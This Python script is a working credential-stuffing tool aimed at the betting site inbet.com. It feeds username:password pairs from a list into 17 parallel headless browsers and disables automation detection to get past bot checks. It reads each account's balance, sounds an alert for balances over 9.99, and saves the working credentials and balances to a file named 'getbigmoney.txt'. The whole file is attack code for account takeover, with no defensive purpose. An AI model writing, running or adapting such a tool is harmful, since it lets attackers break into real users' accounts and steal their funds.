import winsound  # For playing sound on Windows
import re
from selenium import webdriver
from selenium.webdriver.chrome.options import Options
from selenium.webdriver.common.by import By
from selenium.webdriver.support.ui import WebDriverWait
from selenium.webdriver.support import expected_conditions as EC
import undetected_chromedriver as uc
import time
import traceback
import os
from concurrent.futures import ThreadPoolExecutor
import threading
import keyboard  # for detecting keypresses
import sys
from datetime import datetime
import logging

# Configure logging (file + console)
log_file = "activity.log"
log_formatter = logging.Formatter('[%(asctime)s] [%(levelname)s] %(message)s', datefmt='%Y-%m-%d %H:%M:%S')
logger = logging.getLogger(__name__)
logger.setLevel(logging.INFO)

file_handler = logging.FileHandler(log_file)
file_handler.setFormatter(log_formatter)
logger.addHandler(file_handler)

console_handler = logging.StreamHandler()
console_handler.setFormatter(log_formatter)
logger.addHandler(console_handler)

stop_flag = False

def timestamp() -> str:
    return datetime.now().strftime("[%Y-%m-%d %H:%M:%S]")

def emergency_stop_listener():
    global stop_flag
    buffer = []

    while True:
        event = keyboard.read_event()
        if event.event_type == keyboard.KEY_DOWN and event.name == 's':
            buffer.append(time.time())
            buffer = [t for t in buffer if time.time() - t < 3]
            if len(buffer) >= 5:
                logger.critical("'s' pressed 5 times. Emergency stop.")
                stop_flag = True
                os._exit(0)

def read_credentials(file_path):
    with open(file_path, 'r', encoding='utf-8') as file:
        credentials = file.readlines()
    return [line.strip().split(':') for line in credentials]

def init_driver(block_images=True):
    options = uc.ChromeOptions()
    options.add_argument("--disable-extensions")
    options.add_argument("--disable-gpu")
    options.add_argument("--no-sandbox")
    options.add_argument("--log-level=3")
    options.add_argument("--disable-blink-features=AutomationControlled")
    options.add_argument("--headless=new")

    if block_images:
        prefs = {"profile.managed_default_content_settings.images": 2}
        options.add_experimental_option("prefs", prefs)

    version_main = 139
    driver = uc.Chrome(options=options, version_main=version_main)
    driver.set_window_size(1920, 1080)
    return driver

def login(credentials):
    username, password = credentials
    driver = init_driver()

    try:
        driver.get(login_page_url)
        wait = WebDriverWait(driver, 30)

        try:
            accept_cookies_btn = wait.until(
                EC.presence_of_element_located((By.CSS_SELECTOR, '[data-qid="accept-cookies"]'))
            )
            try:
                accept_cookies_btn.click()
            except Exception:
                driver.execute_script("arguments[0].click();", accept_cookies_btn)
            logger.info(f"Cookies accepted for {username}.")
        except Exception:
            logger.warning(f"Accept Cookies button not found or not clickable for {username}. Continuing...")

        try:
            login_button = wait.until(
                EC.element_to_be_clickable((By.XPATH, "/html/body/div[2]/div[2]/div/nav/div/div/div[3]/div[3]/div[2]"))
            )
            login_button.click()
            logger.info(f"Login window opened for {username}.")
        except Exception:
            logger.error(f"Login button not found or not clickable for {username}.")
            return

        try:
            username_field = wait.until(
                EC.visibility_of_element_located(
                    (By.XPATH, "/html/body/div[2]/div[2]/div[2]/div/div/div/div/div/form/div[1]/div/div/div/input")
                )
            )
            username_field.send_keys(username)
            logger.info(f"Username entered for {username}.")
        except Exception:
            logger.error(f"Username field not found for {username}.")
            return

        try:
            password_field = wait.until(
                EC.visibility_of_element_located(
                    (By.XPATH, "/html/body/div[2]/div[2]/div[2]/div/div/div/div/div/form/div[2]/div/div/div/input")
                )
            )
            password_field.send_keys(password)
            logger.info(f"Password entered for {username}.")
        except Exception:
            logger.error(f"Password field not found for {username}.")
            return

        try:
            submit_button = wait.until(
                EC.element_to_be_clickable(
                    (By.XPATH, "/html/body/div[2]/div[2]/div[2]/div/div/div/div/div/form/button")
                )
            )
            submit_button.click()
            logger.info(f"Login button clicked for {username}.")
        except Exception:
            logger.error(f"Submit button not found or not clickable for {username}.")
            return

        formatted_amount = '0.00'
        balance_found = False

        try:
            success_elm = wait.until(
                EC.visibility_of_element_located(
                    (By.CSS_SELECTOR, "div.d-flex-as-je.nav-user.nav-user__logged-in")
                )
            )
            success_text = success_elm.text
            amount_match = re.search(r'\d+(?:[.,]\d+)?', success_text)
            if amount_match:
                amount_str = amount_match.group().replace(',', '.')
                try:
                    amount = float(amount_str)
                    formatted_amount = f"{amount:.2f}"
                    balance_found = True
                except ValueError:
                    pass
        except Exception:
            logger.info(f"Balance element NOT found for {username}.")

        balance_value = float(formatted_amount.replace(',', '.'))

        if balance_value > 9.99:
            try:
                winsound.PlaySound(r"C:\\Users\\petar\\Desktop\\inbet\\minet.wav", winsound.SND_FILENAME | winsound.SND_ASYNC)
                logger.info(f"Balance alert sound played for {username}.")
            except:
                logger.warning(f"Could not play sound.")

        if balance_found:
            with open(success_logins_file, 'a', encoding='utf-8') as file:
                file.write(f"{timestamp()} {username}:{password} - Balance: {formatted_amount}\n")
            logger.info(f"Logged success for {username}. Balance: {formatted_amount}")

    except Exception as e:
        logger.error(f"Exception occurred for {username}: {str(e)}")
        traceback.print_exc()

    finally:
        driver.quit()
        logger.info(f"Driver closed for {username}.")

def main():
    global login_page_url, success_logins_file, stop_flag

    credentials_file = 'credentials.txt'
    success_logins_file = r"C:\\Users\\petar\\Desktop\\inbet\\getbigmoney.txt"
    os.makedirs(os.path.dirname(success_logins_file), exist_ok=True)

    login_page_url = "https://www.inbet.com/sports"
    credentials = read_credentials(credentials_file)

    listener_thread = threading.Thread(target=emergency_stop_listener, daemon=True)
    listener_thread.start()

    max_workers = 17
    with ThreadPoolExecutor(max_workers=max_workers) as executor:
        executor.map(login, credentials)

if __name__ == "__main__":
    main()
